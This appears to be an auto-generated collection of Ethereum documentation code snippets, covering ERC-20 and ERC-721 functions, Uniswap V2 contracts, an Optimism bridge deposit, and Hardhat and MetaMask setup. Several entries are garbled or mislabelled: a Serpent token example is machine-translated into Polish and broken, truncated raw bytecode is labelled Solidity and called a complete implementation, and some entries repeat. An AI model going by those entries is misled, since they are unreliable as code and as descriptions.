`amount` tokens from `account`, reducing the\n * total supply.\n *\n * Emits a {Transfer} event with `to` set to the zero address.\n *\n * Requirements:\n *\n * - `account` cannot be the zero address.\n * - `account` must have at least `amount` tokens.\n */\nfunction _burn(address account, uint256 amount) internal virtual {\n    require(account != address(0), \"ERC20: burn from the zero address\");\n\n    _beforeTokenTransfer(account, address(0), amount);\n\n    _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n    _totalSupply = _totalSupply.sub(amount);\n    emit Transfer(account, address(0), amount);\n}\n```\n\n----------------------------------------\n\nTITLE: ETH Transfer Implementation in Python Decompiled from Solidity\nDESCRIPTION: A code snippet showing how the contract transfers ETH to a recipient address. It calculates the amount based on parameters and window data before initiating the transfer.\n\nLANGUAGE: python\nCODE:\n```\n  call addr(_param2) with:\n     value unknown81e580d3[_param1] * _param3 / 100 * 10^6 wei\n       gas 30000 wei\n```\n\n----------------------------------------\n\nTITLE: swapExactTokensForTokens Function Declaration\nDESCRIPTION: External function that allows users to swap a specific amount of input tokens for a minimum amount of output tokens. This function determines the received amount based on the input quantity.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapExactTokensForTokens(\n```\n\n----------------------------------------\n\nTITLE: Installing Hardhat Development Environment\nDESCRIPTION: Command to install Hardhat as a development dependency for compiling, deploying, testing, and debugging Ethereum smart contracts.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev hardhat\n```\n\n----------------------------------------\n\nTITLE: Implementing totalSupply Function in ERC-20\nDESCRIPTION: Defines the totalSupply function which returns the total amount of tokens in circulation. This external view function doesn't modify state and thus doesn't cost gas when called directly.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: ERC-20 transfer Function Definition\nDESCRIPTION: Defines the transfer function for moving tokens from the caller's account to a recipient. It changes state, emits a Transfer event, and returns a boolean indicating success.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Implementing createPair Function for UniswapV2Factory in Solidity\nDESCRIPTION: This is the main function of the factory, creating exchange pairs between two ERC-20 tokens. It uses CREATE2 for deterministic addressing, ensures pairs aren't duplicated, and updates all necessary mappings and arrays upon creation.\n\nLANGUAGE: solidity\nCODE:\n```\n    function createPair(address tokenA, address tokenB) external returns (address pair) {\n        require(tokenA != tokenB, 'UniswapV2: IDENTICAL_ADDRESSES');\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2: ZERO_ADDRESS');\n        require(getPair[token0][token1] == address(0), 'UniswapV2: PAIR_EXISTS'); // single check is sufficient\n        bytes memory bytecode = type(UniswapV2Pair).creationCode;\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n        assembly {\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        }\n        IUniswapV2Pair(pair).initialize(token0, token1);\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    }\n```\n\n----------------------------------------\n\nTITLE: EOA Restriction Modifier\nDESCRIPTION: Defines a modifier that restricts certain functions to be called only by externally owned accounts (EOAs) and not by contracts. This prevents accidental loss of tokens by ensuring deposits come from user wallets and not contracts.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**************\n     * Depositing *\n     **************/\n\n    /** @dev Modifier requiring sender to be EOA.  This check could be bypassed by a malicious\n     *  contract via initcode, but it takes care of the user error we want to avoid.\n     */\n    modifier onlyEOA() {\n        // Used to stop deposits from contracts (avoid accidentally lost tokens)\n        require(!Address.isContract(msg.sender), \"Account not EOA\");\n        _;\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Initialization in Uniswap Pair\nDESCRIPTION: Function called once by the factory to set the two ERC-20 tokens that this pair will exchange. Only the factory can call this function.\n\nLANGUAGE: solidity\nCODE:\n```\n// called once by the factory at time of deployment\nfunction initialize(address _token0, address _token1) external {\n    require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n    token0 = _token0;\n    token1 = _token1;\n}\n```\n\n----------------------------------------\n\nTITLE: Refunding Excess ETH in Uniswap V2 Router\nDESCRIPTION: This code snippet handles refunding excess ETH sent to the contract during a swap operation. If the user sends more ETH than required, the excess amount is returned to the sender.\n\nLANGUAGE: solidity\nCODE:\n```\n// refund dust eth, if any\nif (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n```\n\n----------------------------------------\n\nTITLE: Deploying a Smart Contract to Ethereum Goerli Testnet\nDESCRIPTION: Command to run the deployment script using Hardhat, which deploys the HelloWorld smart contract to the Goerli testnet using the configured Alchemy provider and wallet.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Writing a Deployment Script for NFT Smart Contract with Ethers.js\nDESCRIPTION: This script uses Ethers.js to deploy the NFT smart contract to the Ethereum network. It creates a contract factory, deploys the contract, and logs the deployed contract address to the console.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const MyNFT = await ethers.getContractFactory(\"MyNFT\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const myNFT = await MyNFT.deploy()\n  await myNFT.deployed()\n  console.log(\"Contract deployed to address:\", myNFT.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: Implementing Wallet Event Listener for Ethereum Wallet State Changes\nDESCRIPTION: A function that sets up an event listener for MetaMask wallet state changes such as account switching or disconnection, updating the UI accordingly.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Hardhat Development Environment\nDESCRIPTION: Command to install Hardhat as a development dependency for compiling, deploying, testing, and debugging Ethereum smart contracts.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev hardhat\n```\n\n----------------------------------------\n\nTITLE: Calculating Token Amounts for Liquidity Withdrawal in Uniswap V2\nDESCRIPTION: Calculates how much of each token should be returned to the liquidity provider based on their share of the total liquidity. This ensures proportional distribution of tokens and maintains the exchange rate.\n\nLANGUAGE: solidity\nCODE:\n```\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n```\n\n----------------------------------------\n\nTITLE: IL1StandardBridge Interface Declaration\nDESCRIPTION: Defines the IL1StandardBridge interface which extends IL1ERC20Bridge to add ETH bridging functionality. This interface handles both ERC-20 tokens and native ETH transfers between layers.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\nimport \"./IL1ERC20Bridge.sol\";\n\n/**\n * @title IL1StandardBridge\n */\ninterface IL1StandardBridge is IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n    event ETHDepositInitiated(\n        address indexed _from,\n        address indexed _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Implementation in Solidity\nDESCRIPTION: A complete ERC20 token implementation that follows the standard interface, including constructor that sets token name and symbol, and includes functions for transfers, approvals, allowances, and balance checks. The contract has SafeMath protections for arithmetic operations to prevent overflow vulnerabilities.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Calling onERC721Received on Contract Recipient\nDESCRIPTION: Makes a call to the recipient contract's onERC721Received function to verify it can properly handle ERC-721 tokens during safe transfers.\n\nLANGUAGE: python\nCODE:\n```\n        returnValue: bytes32 = ERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data)\n```\n\n----------------------------------------\n\nTITLE: Implementing Math Utility Functions for Uniswap V2\nDESCRIPTION: A library that provides mathematical utilities including finding the minimum of two numbers and calculating square roots using the Babylonian method.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\n// a library for performing various math operations\n\nlibrary Math {\n    function min(uint x, uint y) internal pure returns (uint z) {\n        z = x < y ? x : y;\n    }\n\n    // babylonian method (https://wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint y) internal pure returns (uint z) {\n        if (y > 3) {\n            z = y;\n            uint x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-165 Interface Detection for ERC-721\nDESCRIPTION: Sets up the data structures for ERC-165 interface detection, including a HashMap to track supported interfaces and constants for the interface IDs of ERC-165 and ERC-721.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Mapping of interface id to bool about whether or not it's supported\nsupportedInterfaces: HashMap[bytes32, bool]\n\n# @dev ERC165 interface ID of ERC165\nERC165_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000001ffc9a7\n\n# @dev ERC165 interface ID of ERC721\nERC721_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000080ac58cd\n```\n\n----------------------------------------\n\nTITLE: Setting Up useEffect with Smart Contract Listener in React\nDESCRIPTION: React useEffect hook implementation that loads the current message from the smart contract and sets up the event listener when the component mounts. This ensures the UI stays in sync with the blockchain state.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Defining ERC20 Contract with Inheritance in Solidity\nDESCRIPTION: This line declares the ERC20 contract and specifies inheritance from Context (for OpenGSN) and IERC20 interface, which provides the standard token functions that must be implemented.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract ERC20 is Context, IERC20 {\n```\n\n----------------------------------------\n\nTITLE: Finalizing Swap with State Update and Event Emission\nDESCRIPTION: Updates the reserves with the new balances and emits a Swap event with details of the operation, completing the swap transaction.\n\nLANGUAGE: solidity\nCODE:\n```\n}\n\n_update(balance0, balance1, _reserve0, _reserve1);\nemit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Token System in Serpent\nDESCRIPTION: A simple implementation of a token system in Serpent that demonstrates the basic transfer functionality. The code handles token transfers between addresses by checking if the sender has sufficient balance, subtracting the amount from the sender, and adding it to the recipient's balance.\n\nLANGUAGE: Serpent\nCODE:\n```\ndef wyślij (do, wartość):\n    jeśli siebie. torage[msg.sender] >= wartość:\n        siebie. torage[msg.sender] = self.storage[msg.sender] - wartość\n        samo. torage[to] = samodzielny.magazyn[to] + wartość\n```\n\n----------------------------------------\n\nTITLE: Implementing mint Function in ERC-721 Vyper Contract\nDESCRIPTION: This function allows the minter to create new tokens and assign them to a specific address. It includes checks to ensure only the minter can call it, the recipient is valid, and the token ID isn't already in use.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n```\n\n----------------------------------------\n\nTITLE: Initiating ERC20 Deposit from L1 to L2 in Solidity\nDESCRIPTION: This function handles the internal implementation of ERC20 token deposits from L1 to L2. It transfers tokens from the sender to the bridge contract, constructs a cross-domain message to be sent to L2, updates the deposit accounting, and emits an event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateERC20Deposit(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint32 _l2Gas,\n    bytes calldata _data\n) internal {\n    // When a deposit is initiated on L1, the L1 Bridge transfers the funds to itself for future\n    // withdrawals. safeTransferFrom also checks if the contract has code, so this will fail if\n    // _from is an EOA or address(0).\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);\n\n    // Construct calldata for _l2Token.finalizeDeposit(_to, _amount)\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        _l1Token,\n        _l2Token,\n        _from,\n        _to,\n        _amount,\n        _data\n    );\n\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n    // slither-disable-next-line reentrancy-benign\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;\n\n    // slither-disable-next-line reentrancy-events\n    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Smart Contract State with Transaction\nDESCRIPTION: Extended JavaScript function that reads the current message, updates it by sending a transaction to the blockchain, and waits for the transaction to be mined.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"This is the new message.\")\n  await tx.wait()\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Setting Up Environment Variables in .env File for Ethereum Development\nDESCRIPTION: Defines the necessary environment variables in a .env file for connecting to the Ethereum Goerli testnet, including the API URL, API key, private key, and contract address.\n\nLANGUAGE: bash\nCODE:\n```\n# .env\n\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/<your-api-key>\"\nAPI_KEY = \"<your-api-key>\"\nPRIVATE_KEY = \"<your-metamask-private-key>\"\nCONTRACT_ADDRESS = \"0x<your contract address>\"\n```\n\n----------------------------------------\n\nTITLE: Instantiating the ERC20 Token Contract with Web3.js\nDESCRIPTION: JavaScript code that initializes a web3 instance connected to the local Ethereum node and creates the DAI token contract instance using the ABI and contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n\nconst daiToken = new web3.eth.Contract(ERC20TransferABI, DAI_ADDRESS)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Source Mapping and Deployment Bytecode\nDESCRIPTION: Source mapping and deployment bytecode for an ERC20 token contract, showing the relationship between compiled bytecode and source code locations. This includes initializer functions, transfer, approval, and balance handling logic with proper error handling.\n\nLANGUAGE: solidity\nCODE:\n```\n\"sourceMap\": \"142:152:5:-:0;;;177:115;8:9:-1;5:2;;;30:1;27;20:12;5:2;177:115:5;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;177:115:5;;;;;;;;;;;;;;;;2013:141:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2093:4;2085:5;:12;;;;;;;;;;;;:::i;:::-;;2117:6;2107:7;:16;;;;;;;;;;;;:::i;:::-;;2145:2;2133:9;;:14;;;;;;;;;;;;;;;;;;2013:141;;252:33:5::1;258:10;270:14;252:5;;;:33;;:::i;:::-;177:115:::0;142:152;;7835:370:2;7937:1;7918:21;;:7;:21;;;;7910:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7986:49;8015:1;8019:7;8028:6;7986:20;;;:49;;:::i;:::-;8061:24;8078:6;8061:12;;:16;;;;;;:24;;;;:::i;:::-;8046:12;:39;;;;8116:30;8139:6;8116:9;:18;8126:7;8116:18;;;;;;;;;;;;;;;;:22;;;;;;:30;;;;:::i;:::-;8095:9;:18;8105:7;8095:18;;;;;;;;;;;;;;;:51;;;;8182:7;8161:37;;8178:1;8161:37;;;8191:6;8161:37;;;;;;;;;;;;;;;;;;7835:370;;:::o;10695:92::-;;;;:::o;874:176:1:-;932:7;951:9;967:1;963;:5;951:17;;991:1;986;:6;;978:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1042:1;1035:8;;;874:176;;;;:::o;142:152:5:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;;\"\n```\n\n----------------------------------------\n\nTITLE: Instantiating the ERC20 Token Contract with Web3.js\nDESCRIPTION: JavaScript code that initializes a web3 instance connected to the local Ethereum node and creates the DAI token contract instance using the ABI and contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n\nconst daiToken = new web3.eth.Contract(ERC20TransferABI, DAI_ADDRESS)\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Contract in Solidity\nDESCRIPTION: A complete ERC20 token implementation with constructor initialization, standard token functions, and SafeMath operations. The contract creates a token named 'Basic' with symbol 'BSC' and includes all standard ERC20 functionality like transfer, approve, transferFrom, along with safety checks.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080f